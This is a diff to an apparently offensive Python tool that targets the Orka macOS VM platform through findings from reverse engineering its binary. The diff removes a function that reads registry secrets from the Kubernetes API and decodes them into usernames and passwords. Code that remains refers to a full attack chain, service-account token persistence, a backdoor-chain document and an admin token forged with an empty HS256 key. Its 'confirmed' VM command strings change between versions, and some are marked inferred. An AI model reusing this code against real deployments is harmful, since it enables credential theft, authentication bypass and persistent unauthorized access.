@@ -156,39 +156,18 @@ ORKA_VM_CONTAINER = 'orka-vm'
 # Confirmed from map.init.0 success strings ("Domain macos started", "Domain macos destroyed")
 VIRSH_DOMAIN = 'macos'
 
-# vmActions map — confirmed from map.init.0 disassembly (vmiexec.map.init.0 @ 0x1c707a0)
-# Success/error strings extracted from packed go:string.* pool at confirmed offsets:
-#   0x21fc7e1 "Domain macos started"  — virsh start success
-#   0x21fff3f "Domain macos destroy"  — virsh destroy success
-#   0x21fc7f5 "VM has been reverted"  — snapshot-revert success
-#   0x21e2f72 "running"               — virsh domstate value
-#   0x21fe5da "VM is already running" — start error (already running)
-#   0x21e141e "paused"                — virsh domstate value
-#   0x21f27f6 "VM is suspended"       — suspend success
-#   0x21f0dce "VM has started"        — start success (internal string)
-#   0x21df6f0 "start"                 — K8s readiness probe state
-#   0x21e607d "shut off"              — virsh domstate value
-#   0x21fe5ef "VM is already stopped" — stop error
+# Confirmed VMCommand string keys from map.init.0 disassembly
 VM_COMMANDS = {
-    'start':   {'virsh_state': 'shut off', 'success': 'Domain macos started', 'error': 'VM is already running'},
-    'destroy': {'virsh_state': 'running',  'success': 'Domain macos destroy',  'error': 'VM is already stopped'},
-    'revert':  {'virsh_state': 'running',  'success': 'VM has been reverted',  'error': 'VM is already running'},
-    'suspend': {'virsh_state': 'running',  'success': 'VM is suspended',       'error': None},
+    'start':   {'virsh_state': 'shut off', 'success': 'VM has started',     'error': 'VM is already stopped'},
+    'stop':    {'virsh_state': 'running',  'success': 'VM has stopped',      'error': 'VM is stopped'},
+    'revert':  {'virsh_state': 'running',  'success': 'VM has been reverted','error': 'VM is already running'},
+    'resume':  {'virsh_state': 'paused',   'success': 'Domain macos resumed', 'error': None},
+    'suspend': {'virsh_state': 'running',  'success': 'VM is suspended',     'error': None},  # inferred
 }
 
 # VM state strings used in vmCommandDescriptor.virshState (virsh domstate output values)
-# Confirmed from go:string.* pool disassembly
 VM_STATES = {'running', 'shut off', 'paused'}
 
-# Registry credential storage (confirmed from addCredentials @ 0x18579e0 disassembly):
-# - Uses K8s controller-runtime client (GetRuntimeClient @ 0x181f420)
-# - Creates K8s Secret (type *v1.Secret, ITAB 0x27542b8)
-# - Secret key: '.dockerconfigjson' (mapaccess1_faststr @ 0x1857b20, key string at 0x21f5d5b)
-# - Secret name prefix: 'orka-registry' (string at 0x21eea69)
-# - Stored in orka-default namespace
-# → K8s Secrets API gives DIRECT access without Orka API routing
-REGCRED_SECRET_KEY  = '.dockerconfigjson'
-REGCRED_NAME_PREFIX = 'orka-registry'
 # Fill locally from orka_oidc_re.forge_admin_token()
 ADMIN_TOKEN      = 'FILL_IN_LOCALLY'
 
@@ -480,66 +459,6 @@ def list_registry_credentials(token: str = ADMIN_TOKEN,
     return r
 
 
-def extract_registry_secrets_k8s(token: str = ADMIN_TOKEN,
-                                   ns: str = ORKA_DEFAULT_NS,
-                                   k8s_base: str = K8S_API) -> dict:
-    """
-    Extract Docker registry credentials directly from K8s Secrets API.
-
-    Binary RE finding (addCredentials @ 0x18579e0):
-      - Credentials stored as K8s Secret (type kubernetes.io/dockerconfigjson)
-      - Secret key: '.dockerconfigjson' (mapaccess1_faststr @ 0x1857b20)
-      - Secret name pattern: 'orka-registry-{server}' (string 0x21eea69)
-      - Stored in orka-default namespace
-
-    Direct K8s API access bypasses the Orka API wrapper entirely.
-    Requires admin JWT (forge via empty HS256 key).
-
-    Returns decoded credentials dict: {server: {user, password}}.
-    """
-    url = f'{k8s_base}/api/v1/namespaces/{ns}/secrets'
-    r = _http('GET', url, token=token)
-    result = {
-        'url': url,
-        'status': r.get('status'),
-        'secrets_found': 0,
-        'registry_creds': {},
-        'all_secret_names': [],
-        'error': r.get('error'),
-    }
-
-    body = r.get('body')
-    if not isinstance(body, dict):
-        return result
-
-    items = body.get('items', [])
-    result['secrets_found'] = len(items)
-    for item in items:
-        name = item.get('metadata', {}).get('name', '')
-        result['all_secret_names'].append(name)
-        if not name.startswith(REGCRED_NAME_PREFIX):
-            continue
-        data = item.get('data', {})
-        docker_json = data.get(REGCRED_SECRET_KEY)
-        if not docker_json:
-            continue
-        try:
-            decoded = json.loads(base64.b64decode(docker_json))
-            auths = decoded.get('auths', {})
-            for server, auth_data in auths.items():
-                raw_auth = auth_data.get('auth', '')
-                try:
-                    cred_str = base64.b64decode(raw_auth).decode()
-                    user, password = cred_str.split(':', 1)
-                    result['registry_creds'][server] = {'user': user, 'password': password}
-                except Exception:
-                    result['registry_creds'][server] = {'raw_auth': raw_auth}
-        except Exception as e:
-            result['registry_creds'][name] = {'parse_error': str(e)[:100]}
-
-    return result
-
-
 def probe_harbor_api(token: str = ADMIN_TOKEN,
                      harbor_base: str = HARBOR_HOST) -> dict:
     """
@@ -645,18 +564,14 @@ def run_full_attack_chain(token: str = ADMIN_TOKEN,
     print('[orka_vm_exec_re] Chain B: SA token persistence...')
     sa_token = create_service_account_token('default', token, k8s_base=k8s_base)
 
-    print('[orka_vm_exec_re] Chain C: Registry credential extraction (Orka API)...')
+    print('[orka_vm_exec_re] Chain C: Registry credential extraction...')
     regcreds = list_registry_credentials(token, api_base=api_base)
-
-    print('[orka_vm_exec_re] Chain C: Registry credential extraction (K8s Secrets API)...')
-    regcreds_k8s = extract_registry_secrets_k8s(token, k8s_base=k8s_base)
 
     return {
         'api_surface': api_surface,
         'vm_exec': vm_exec,
         'sa_token_persistence': sa_token,
         'registry_credentials': regcreds,
-        'registry_credentials_k8s_secrets': regcreds_k8s,
         'backdoor_chain_doc': BACKDOOR_CHAIN_DOC,
     }
 
@@ -671,8 +586,6 @@ if __name__ == '__main__':
         print(json.dumps(create_service_account_token('default'), indent=2, default=str))
     elif '--regcreds' in sys.argv:
         print(json.dumps(list_registry_credentials(), indent=2, default=str))
-    elif '--regcreds-k8s' in sys.argv:
-        print(json.dumps(extract_registry_secrets_k8s(), indent=2, default=str))
     elif '--harbor' in sys.argv:
         print(json.dumps(probe_harbor_api(), indent=2, default=str))
     elif '--backdoor-doc' in sys.argv:
